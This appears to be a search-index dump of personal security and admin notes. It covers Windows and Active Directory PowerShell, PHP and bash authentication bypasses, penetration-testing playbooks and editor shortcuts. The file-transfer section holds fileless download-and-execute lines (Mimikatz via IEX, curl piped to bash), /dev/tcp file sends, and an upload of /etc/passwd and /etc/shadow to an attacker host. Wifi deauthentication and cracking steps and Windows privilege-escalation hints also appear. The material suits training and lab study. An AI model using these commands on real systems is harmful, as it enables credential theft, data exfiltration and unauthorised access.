REG_SZ C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe   Shows the current applications ran by the user.  ","version":"Next","tagName":"h3"},{"title":"AppLocker: Application Whitelist​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#applocker-application-whitelist","content":" An application whitelist is a list of approved software applications or executables allowed to be present and run on a system.  Applocker is the Windows whitelist mechanism. AppLocker gives system administrators control over which applications and files users can run. It gives granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.  ","version":"Next","tagName":"h3"},{"title":"Local Group Policy​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#local-group-policy","content":" Group Policy allows administrators to set, configure, and adjust a variety of settings. In a domain environment, group policies are pushed down from a Domain Controller onto all domain-joined machines that Group Policy objects (GPOs) are linked to. These settings can also be defined on individual machines using Local Group Policy.  Local Group Policy can be used to tweak certain graphical and network settings that are otherwise not accessible via the Control Panel. It can also be used to lock down an individual computer policy with stringent security settings, such as only allowing certain programs to be installed/run or enforcing strict user account password requirements.  The editor can be opened with gpedit.msc command.  ","version":"Next","tagName":"h3"},{"title":"Windows Defender Antivirus​","type":1,"pageTitle":"Windows fundamentals","url":"/docs/Hacking/HTB Academy/Windows fundamentals#windows-defender-antivirus","content":" Modern windows comes with Windows Defender Antivirus enabled by default.  We can use the PowerShell cmdlet Get-MpComputerStatus to check which protection settings are enabled:  PS C:\\htb&gt; Get-MpComputerStatus | findstr &quot;True&quot; AMServiceEnabled : True AntispywareEnabled : True AntivirusEnabled : True BehaviorMonitorEnabled : True IoavProtectionEnabled : True IsTamperProtected : True NISEnabled : True OnAccessProtectionEnabled : True RealTimeProtectionEnabled : True  ","version":"Next","tagName":"h3"},{"title":"Bash","type":0,"sectionRef":"#","url":"/docs/languages/bash","content":"","keywords":"","version":"Next"},{"title":"Pattern matching comparison​","type":1,"pageTitle":"Bash","url":"/docs/languages/bash#pattern-matching-comparison","content":" This comparisson is making a pattern matching instead of a string equality comparisson.  if [[ $DB_PASS == $USER_PASS ]]; then   This leads to the issue that the user does not need to know the value of DB_PASS to go through this if. If USER_PASS is *, the if will evaluate to true. This leads to a even worse situation, we can brute force the value of the variable by adding characters to the variable, e.g:  a* -&gt; Password succed -&gt; First char is a, let's try next char ... ab* -&gt; Password succeed -&gt; We know the password is ab, etc...  And repeat this process until all chars are revealed. ","version":"Next","tagName":"h2"},{"title":"PHP","type":0,"sectionRef":"#","url":"/docs/languages/php","content":"","keywords":"","version":"Next"},{"title":"Type juggling​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#type-juggling","content":" Due to the nature of PHP we can abuse the type jungling feature. When comparing variables of different types, PHP will convert them to a common, comparable type.  The following condition will be true and print the message.  $example_int = 7 $example_str = &quot;7&quot; if ($example_int == $example_str) { echo(&quot;PHP can compare ints and strings.&quot;) }   An if with == will not check the types. Only === check the types.  If the string to be compared does not contain an integer, it will be converted to 0, e.g:  (&quot;Puppies&quot; == 0) -&gt; True   So, if you see some compraison with PHP is worth trying to exploit this vulnerability  Applying this to the security world, we can bypass auth by using this loose comparison:  if ($_POST[&quot;password&quot;] == &quot;Admin_Password&quot;) {login_as_admin();}   Then, to bypass the auth the user only need to provide 0 integer as input:  (0 == “Admin_Password”) -&gt; True   Reference: https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09  ","version":"Next","tagName":"h2"},{"title":"strcmp​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#strcmp","content":" The strcmp method is also affected by the loose comparison.  if(strcmp($PASSWORD, $_GET['password']) == 0){ $success = true; }   Thanks to the type juggling describe above, if strcmp returns NULL the condition will be true. We can force this by passing the password field as an array:  http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22   Reference: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016 ","version":"Next","tagName":"h2"},{"title":"Useful commands","type":0,"sectionRef":"#","url":"/docs/linux-useful-commands","content":"","keywords":"","version":"Next"},{"title":"Environment variables by variable​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#environment-variables-by-variable","content":" Imagine we need to access the contents of an environment variable, but its name is stored in another variable.  For example:  DEV_AWS_ACCESS_KEY_ID=&quot;1234-dev&quot; RD_AWS_ACCESS_KEY_ID=&quot;abcd-prd&quot;   This could happen for instance while configuring multiple AWS in a CI system.  Let's continue with the example, the CI system provide a variable called &quot;stage&quot;, which can be dev or prd; then we want to prepend the content of this variable to get the credentials to the proper account:  CUR_ENV=`echo ${stage} | tr a-z A-Z` ENV_ACCESS_KEY=&quot;${CUR_ENV}_AWS_ACCESS_KEY_ID&quot;   Now the magic comes, if this the shell is based in bash, we could the technique called as &quot;variable indirection&quot;, like this:  ACTUAL_KEY=echo ${!ENV_ACCESS_KEY}   However, this will not work on all the shells, a more general solution could be:  eval ACTUAL_KEY=\\$$ENV_ACCESS_KEY   However, there might be security implications by using eval  ","version":"Next","tagName":"h2"},{"title":"Check if there are git changes in script​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#check-if-there-are-git-changes-in-script","content":" In a CI pipeline, you might want to check if there are changes to create an automatic commit, etc.  You can do that by running the following snippet:  git diff-index --quiet HEAD ANY_CHANGE=$? [ $ANY_CHANGE -ne 0 ] &amp;&amp; echo &quot;Do something with the change&quot;   ","version":"Next","tagName":"h2"},{"title":"See strings in binary file​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#see-strings-in-binary-file","content":" strings login.php.swp  ","version":"Next","tagName":"h2"},{"title":"Active Directory","type":0,"sectionRef":"#","url":"/docs/playbooks/active-directory","content":"","keywords":"","version":"Next"},{"title":"Powershell​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#powershell","content":" All the commands listed here as supposed to be executed from a Windows machine with access to powershell. Similar actions can be executed from a Linux machine but with other commands.  Reference: https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps  ","version":"Next","tagName":"h2"},{"title":"Users​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#users","content":" Add to the domain   New-ADUser -Name &quot;Orion Starchaser&quot; -Accountpassword (ConvertTo-SecureString -AsPlainText (Read-Host &quot;Enter a secure password&quot;) -Force ) -Enabled $true -OtherAttributes @{'title'=&quot;Analyst&quot;;'mail'=&quot;o.starchaser@inlanefreight.local&quot;} -ChangePasswordAtLogon $true   Add to particular organization unit  New-ADUser -Name &quot;KarimBuzdar&quot; -GivenName &quot;Karim&quot; -Surname &quot;Buzdar&quot; -SamAccountName &quot;kbuzdar&quot; -UserPrincipalName &quot;kbuzdar@faqforge.com&quot; -Path &quot;OU=Users,DC=faqforge,DC=com&quot; -AccountPassword (ConvertTo-SecureString &quot;P@ssw0rd!&quot; -AsPlainText -Force) -Enabled $true   Remove-ADUser -Identity pvalencia   Get a particular user  Get-ADUser -Identity m.ohare   Get all users in organization unit:  Get-ADUser -Filter * -SearchBase &quot;OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM&quot;   Search for user with a filter:  Get-ADUser -Filter 'Name -like &quot;*SvcAccount&quot;' | Format-Table Name,SamAccountName -A   Get all properties:  Get-ADUser -Identity amasters -Properties *   ","version":"Next","tagName":"h3"},{"title":"Unlock account​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#unlock-account","content":" Unlock account:  Unlock-ADAccount -Identity amasters   Set new password:  Set-ADAccountPassword -Identity amasters -NewPassword (ConvertTo-SecureString -AsPlainText &quot;qwert@12345&quot; -Force)   Force change password after next logon:  Set-ADUser -Identity amasters -ChangePasswordAtLogon $true   ","version":"Next","tagName":"h3"},{"title":"Organization unit​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#organization-unit","content":" Create a new OU under some path  New-ADOrganizationalUnit -Name &quot;Analysts&quot; -Path &quot;OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   Move created user to the new created OU  Move-ADObject -Identity a.callisto -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   or by Common name:  Move-ADObject -Identity &quot;CN=a.callisto,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   ","version":"Next","tagName":"h3"},{"title":"Security group​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group","content":" New-ADGroup -Name &quot;Security Analysts&quot; -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName &quot;Security Analysts&quot; -Path &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -Description &quot;Members of this group are Security Analysts under the IT OU&quot;   Add users to the group:  Add-ADGroupMember -Identity analysts -Members ACepheus,OStarchaser,ACallisto   ","version":"Next","tagName":"h3"},{"title":"Security group policy​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group-policy","content":" Get by name:  Get-GPO -Name &quot;Group Policy Test&quot;   Copy and rename GPO (Group policy Object):  Copy-GPO -SourceName &quot;Logon Banner&quot; -TargetName &quot;Security Analysts Control&quot;   Link the GPO to a OU:  New-GPLink -Name &quot;Security Analysts Control&quot; -Target &quot;ou=Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL&quot; -LinkEnabled Yes   To edit the security group policy it's better to do it from the UI, using the Group Policy Management Center (GPMC) available in Server Management &gt; Tools.  ","version":"Next","tagName":"h3"},{"title":"Computer​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#computer","content":" Add a computer to the domain, credentials refer to the user whose credentials we will use to authorize the join:  Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\HTB-student_adm' -Restart   That command must be run from the computer that did not join the domain yet.  You can do the same but remotely:  Add-Computer -ComputerName ACADEMY-IAD-W10 -LocalCredential ACADEMY-IAD-W10\\image -DomainName INLANEFREIGHT.LOCAL -Credential INLANEFREIGHT\\htb-student_adm -Restart   We can we the details of a computer in the domain by running:  Get-ADComputer -Identity &quot;name&quot; -Properties * | select CN,CanonicalName,IPv4Address   You can move the computer to another OU by running:  Move-ADObject -Identity &quot;name&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   ","version":"Next","tagName":"h3"},{"title":"Bash​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#bash","content":" Add one user to a group on behalf of another user (-U)  net rpc group addmem &quot;SERVICE ACCOUNTS@FLUFFY.HTB&quot; &quot;p.agila&quot; -U &quot;fluffy.htb&quot;/&quot;P.AGILA&quot;%&quot;prometheusx-303&quot; -S 10.10.11.69 ``  ","version":"Next","tagName":"h2"},{"title":"File transfer","type":0,"sectionRef":"#","url":"/docs/playbooks/file-transfer","content":"","keywords":"","version":"Next"},{"title":"Base64 encode/decode​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#base64-encodedecode","content":" If the payload to transmit is small enough, do base64 encode/decode and later check md5 hashes match  base64 -w0 &lt;file&gt; #Encode file base64 -d file #Decode file   ","version":"Next","tagName":"h2"},{"title":"Powershell​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#powershell","content":" Complete reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239  (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')   Fileless method: it does not touch the disk  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')   Upload, powershell does not have a native cmdlet to perform HTTP uploads, however we can install this feature  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts   Upload with base64:  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64   Upload via FTP:  (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')   ","version":"Next","tagName":"h2"},{"title":"Samba​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#samba","content":" Start a impacket samba server on the attacker machine:  sudo impacket-smbserver share -smb2support /tmp/smbshare sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   Note: the folder will not be created automatically, so you might want to create it beforehand.  Then to download a file from the attack machine to the target machine:  copy \\\\192.168.220.133\\share\\nc.exe   Or to upload a file from the target machine to the attack machine  copy upload_win.txt \\\\192.168.220.133\\share   If the samba ports are blocked, it's worth trying with WebDAV which runs SMB over HTTP.  Attacker machine:  sudo pip install wsgidav cheroot sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous   Target machine:  dir \\\\192.168.49.128\\DavWWWRoot copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\   Note: `DavWWWRoot`` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.  You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder  ","version":"Next","tagName":"h2"},{"title":"ftp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#ftp","content":" Start a FTP server in the attacker:  sudo pip3 install pyftpdlib sudo python3 -m pyftpdlib --port 21   By default it will try to run at port 2121, so we need to explicitly say port 21 (and sudo).  At the target machine, we can use powershell cmdlet:  (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')   If the shell is not interactive, we'll need to create a file with the FTP commands, e.g.:  C:\\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt C:\\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt C:\\htb&gt; echo binary &gt;&gt; ftpcommand.txt C:\\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt C:\\htb&gt; echo bye &gt;&gt; ftpcommand.txt C:\\htb&gt; ftp -v -n -s:ftpcommand.txt ftp&gt; open 192.168.49.128 Log in with USER and PASS first. ftp&gt; USER anonymous ftp&gt; GET file.txt ftp&gt; bye C:\\htb&gt;more file.txt This is a test file   ","version":"Next","tagName":"h2"},{"title":"wget​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#wget","content":" wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # fileless wget wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3   ","version":"Next","tagName":"h2"},{"title":"curl​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#curl","content":" curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # fileless curl curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash   ","version":"Next","tagName":"h2"},{"title":"nc​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#nc","content":" nc -lvnp 9002 &gt; SharpKatz.exe #Inside receiver nc -q 0 192.168.49.128 9002 &lt; SharpKatz.exe #In sender   ","version":"Next","tagName":"h2"},{"title":"dev/tcp​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#devtcp","content":" As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.  exec 3&lt;&gt;/dev/tcp/10.10.10.32/80 echo -e &quot;GET /LinEnum.sh HTTP/1.1\\n\\n&quot;&gt;&amp;3 cat &lt;&amp;3 cat metabase.db.trace.db &gt; /dev/tcp/10.10.14.102/9002 # Send the file cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe # Receive the file   ","version":"Next","tagName":"h2"},{"title":"python​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#python","content":" Attacker machine runs HTTP(s) server  sudo python3 -m pip install --user uploadserver python3 -m http.server 5555 sudo python3 -m uploadserver 443 --server-certificate /root/server.pem   Target machine uploads file:  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure   ","version":"Next","tagName":"h2"},{"title":"Self-signed certificate​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#self-signed-certificate","content":" openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'   ","version":"Next","tagName":"h2"},{"title":"Living off The Land​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#living-off-the-land","content":" You can abuse of binaries supposed to perform an action to escape from some prohibited binaries. This is same concept as the privilege escalation using GTFObins.  You can use:  https://lolbas-project.github.io/# for windowshttps://gtfobins.github.io/ for Linux  For example, for Windows we can use certreq.exe:  certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini   For example in Linux, you can abuse openssl:  On attacker:  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh   On target:  openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh  ","version":"Next","tagName":"h2"},{"title":"Improve shell","type":0,"sectionRef":"#","url":"/docs/playbooks/improve-shell","content":"","keywords":"","version":"Next"},{"title":"When python is available​","type":1,"pageTitle":"Improve shell","url":"/docs/playbooks/improve-shell#when-python-is-available","content":" In order to get a better shell, we could the following commands:  python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' export TERM=xterm ctrl + z stty raw -echo; fg   You can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  ","version":"Next","tagName":"h2"},{"title":"No python available​","type":1,"pageTitle":"Improve shell","url":"/docs/playbooks/improve-shell#no-python-available","content":" script -q /dev/null -c bash   or  stty raw -echo; fg  ","version":"Next","tagName":"h2"},{"title":"OWASP TOP 10","type":0,"sectionRef":"#","url":"/docs/playbooks/owasp","content":"","keywords":"","version":"Next"},{"title":"Broken Access Control​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#broken-access-control","content":" https://owasp.org/Top10/A01_2021-Broken_Access_Control  Malicious users can manipulate access control mechanisms.  Examples of this are:  Modify the loging cookie to change from regular user to admin userManipulate JWT Tokens...  ","version":"Next","tagName":"h2"},{"title":"Cryptographic Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#cryptographic-failures","content":" https://owasp.org/Top10/A02_2021-Cryptographic_Failures/  Examples of this are:  Using old ciphers in symmetric encryptionUsing short keys for RSA key: able to generate the private key from the public keyUnsalted passwords...  ","version":"Next","tagName":"h2"},{"title":"Injection​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#injection","content":" https://owasp.org/Top10/A03_2021-Injection/  When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.  Examples are:  SQL injections: break the SQL query syntax to execute arbitrary queriesOS injections: being able to execute OS commands via the user inputServer-side template injection: abuse a template engine to inject any code...  The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.  If you don't see the results back, you can try 2 things:  Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the dataAbuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.  ","version":"Next","tagName":"h2"},{"title":"Insecure Design​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#insecure-design","content":" https://owasp.org/Top10/A04_2021-Insecure_Design/  Examples of this are:  Bot detection mechanismCredentials hardcoded in the code...  ","version":"Next","tagName":"h2"},{"title":"Security Misconfiguration​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#security-misconfiguration","content":" https://owasp.org/Top10/A05_2021-Security_Misconfiguration/  This topic is very broad and might include things like:  Default users, passwordsUnprotected paths of the application (remember nginx off-by-slash vulnerability)Stack traces revealing information to the user  ","version":"Next","tagName":"h2"},{"title":"Vulnerable and Outdated Components​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#vulnerable-and-outdated-components","content":" https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components  Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix  When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it's worth trying to replicate it in your setup.  ","version":"Next","tagName":"h2"},{"title":"Identification and Authentication Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#identification-and-authentication-failures","content":" https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/  Examples:  Default/weak passwordAllowing brute force attacks to guess username/password  ","version":"Next","tagName":"h2"},{"title":"Software and Data Integrity Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#software-and-data-integrity-failures","content":" https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/  Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input.  If the user can see and modify a serialized payload, that payload should be handled with extra care.  Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.  ","version":"Next","tagName":"h2"},{"title":"Security Logging and Monitoring Failures​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#security-logging-and-monitoring-failures","content":" https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures  Not enough monitoring for scenarios like excessive number of failed login attemps, etc...  ","version":"Next","tagName":"h2"},{"title":"Server-Side Request Forgery (SSRF)​","type":1,"pageTitle":"OWASP TOP 10","url":"/docs/playbooks/owasp#server-side-request-forgery-ssrf","content":" https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29  This happens when an application fetches a resource from a third-pary based on the input provided by a user.  For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attacker might include their own crafted version of the image that includes malicious code. ","version":"Next","tagName":"h2"},{"title":"Pentesting Windows","type":0,"sectionRef":"#","url":"/docs/playbooks/pentesting-windows","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#enumeration","content":" nmapSMBLDAP dumpAD using BloodHound and analyze output of BloodHound with its UI and find shortest path to valuable assetsMS-SQL xp_dirtree  ","version":"Next","tagName":"h2"},{"title":"Getting foothold​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#getting-foothold","content":" Brute force users via SMB with crackmapexecPassword spray the users with crackmapexecConnect with evil-winrm (SSH equivalent)Shadow credential: when a user has write access to another user KeyCredentialLink, the user can write its public key material to it, forcing AD to send the NTLM token to the attacker. Use certipy-ad shadow auto to perform this kind of attack.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#privilege-escalation","content":" certipy: check if the user you have at this point has Manage Certificates or Manage CA. If it have it, you can use certify to issues an Administrator certificate to be used to leak NTLM hash.PEAS-ng: https://github.com/carlospolop/PEASS-ngicacls: check permission of files ","version":"Next","tagName":"h2"},{"title":"Chrome","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Chrome","content":"Chrome Shortcut\tDescriptionNew tab\tCMD + t Next tab\toption + CMD + Arrow right/left Go to tab 1\tCMD + 1 Go to tab 2\tCMD + 2","keywords":"","version":"Next"},{"title":"IntelliJ","type":0,"sectionRef":"#","url":"/docs/Shortcuts/IntelliJ","content":"IntelliJ Shortcut\tDescriptionMove between open projects\toption + CMD + ` Open terminal\toption + fn + F12 Select\toption + Arrow Up/Down Move between words\toption + Arrow Left/Right Fold\tCMD (+) + Unfold\tCMD (+) - Search and replace\tCMD+R + option +A Project structure section\tCMD+1 Run section\tCMD+4 Go to line\tCMD+L See implementations\toption+CMD+B See usages\tCMD+B Move\tF6 Rename\tSHIT + F6 Go to test\tSHIT + CMD + T Recent files\tCMD + E Add breakpoint\tCMD + F8 Run\tCONTROL + SHIFT + R Debug\tCONTROL + SHIFT + D Delete line\tCMD + Erase","keywords":"","version":"Next"},{"title":"Mac OS","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Mac OS","content":"Mac OS Shortcut\tDescriptionCurrent application to fullscreen\tcontrol + CMD + F Move between fullscreen apps\tcontrol + Arrow right/left Finder go to folder\tCMD + Shift + G Finder see hidden files\tCMD + Shift + . Finder copy and paste\tCMD + C + CMD + V Finder copy and move\tCMD + C + CMD + option + V","keywords":"","version":"Next"},{"title":"Vim","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Vim","content":"","keywords":"","version":"Next"},{"title":"How to​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#how-to","content":" ","version":"Next","tagName":"h2"},{"title":"Add text to multiple lines:​","type":1,"pageTitle":"Vim","url":"/docs/Shortcuts/Vim#add-text-to-multiple-lines","content":" Visual block modeSelect where to changePress IPerform the change in one linePress ESCThe change will propagate ","version":"Next","tagName":"h3"},{"title":"Pentesting wifi networks","type":0,"sectionRef":"#","url":"/docs/playbooks/wifi","content":"","keywords":"","version":"Next"},{"title":"Enable monitor mode​","type":1,"pageTitle":"Pentesting wifi networks","url":"/docs/playbooks/wifi#enable-monitor-mode","content":" Check if you have processes that will interfere with monitor mode:  └─$ sudo airmon-ng check [sudo] password for gal: Found 4 processes that could cause trouble. Kill them using 'airmon-ng check kill' before putting the card in monitor mode, they will interfere by changing channels and sometimes putting the interface back in managed mode PID Name 817 avahi-daemon 839 avahi-daemon 891 NetworkManager 963 wpa_supplicant   Kill them  ┌──(gal㉿gal)-[~/workspace/gal/docs] └─$ sudo airmon-ng check kill Killing these processes: PID Name 963 wpa_supplicant   Start monitor mode  └─$ sudo airmon-ng start wlan0 PHY Interface Driver Chipset phy0 wlan0 iwlwifi Intel Corporation Alder Lake-P PCH CNVi WiFi (rev 01) (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon) (mac80211 station mode vif disabled for [phy0]wlan0)   Now wlan0 might change to wlan0mon  ","version":"Next","tagName":"h2"},{"title":"Capture the traffic​","type":1,"pageTitle":"Pentesting wifi networks","url":"/docs/playbooks/wifi#capture-the-traffic","content":" Start checking what's around:  sudo airodump-ng wlan0mon   Once you have found a target, specify the channel and the bssid:  sudo airodump-ng --bssid 66:8B:92:F9:A2:9A -w /tmp/guifiwc wlan0mon -c 11   This will store the traffic in the specified files with -w. Once you find an station connected to the bssid, you can start a de-auth attack.  ","version":"Next","tagName":"h2"},{"title":"Deauth attack​","type":1,"pageTitle":"Pentesting wifi networks","url":"/docs/playbooks/wifi#deauth-attack","content":" The deauth attack will send packets to the WiFi client to force a de-authentication and a later authentication within the network. This will produce a bunch of auth messages signed with the hash of the WiFi password, which later we'll try to bruteforce with a dictionary attack.  sudo aireplay-ng -0 2 -c FA:50:A4:49:2F:AA -a 66:8B:92:F9:A2:9A wlan0mon   -0 means deauth and 2 is the number of deauth packets to send-c is the client MAC address-a is the station BSSID.  Once this is done successfully, airodump will show a bunch of received data.  ","version":"Next","tagName":"h2"},{"title":"Crack the password​","type":1,"pageTitle":"Pentesting wifi networks","url":"/docs/playbooks/wifi#crack-the-password","content":" Now pass the capture to aircrack-ng to bruteforce the password using a dictionary:  aircrack-ng -a2 -b 66:8B:92:F9:A2:9A -w /usr/share/wordlists/rockyou.txt /tmp/guifiwc-02.cap   ","version":"Next","tagName":"h2"},{"title":"Revert to normal mode​","type":1,"pageTitle":"Pentesting wifi networks","url":"/docs/playbooks/wifi#revert-to-normal-mode","content":" Stop airmin-ng:  └─$ sudo airmon-ng stop wlan0mon PHY Interface Driver Chipset phy0 wlan0mon iwlwifi Intel Corporation Alder Lake-P PCH CNVi WiFi (rev 01) (mac80211 station mode vif enabled on [phy0]wlan0) (mac80211 monitor mode vif disabled for [phy0]wlan0mon)   You might need to start NetworkManager or similar:  sudo NetworkManager   More: https://github.com/ricardojoserf/wifi-pentesting-guide?tab=readme-ov-file#4 ","version":"Next","tagName":"h2"},{"title":"VSCode","type":0,"sectionRef":"#","url":"/docs/Shortcuts/VSCode","content":"VSCode Shortcut\tDescriptionGo to file\tCMD + P Go to terminal\tcontrol + ` Go to editor\tcontrol + 1,2,3,.. Search\tCMD + F Search-replace\toption + CMD + F Fold\tCMD + K + 0 Unfold\tCMD + K + J See all shortcuts\tCMD + K + S Go to explorer\tCMD + shift + e Multi-cursor search\tSelect the term to search and CMD + shift + L Duplicate line\tSHIFT + OPT + arro down","keywords":"","version":"Next"},{"title":"evil-winrm","type":0,"sectionRef":"#","url":"/docs/tooling/evilwinrm","content":"evil-winrm Once you know the user/password of a Windows target, you can use https://github.com/Hackplayers/evil-winrm to connect to the Powershell. Consider this tool as the PowerShell for Linux. The usage is quite easy: 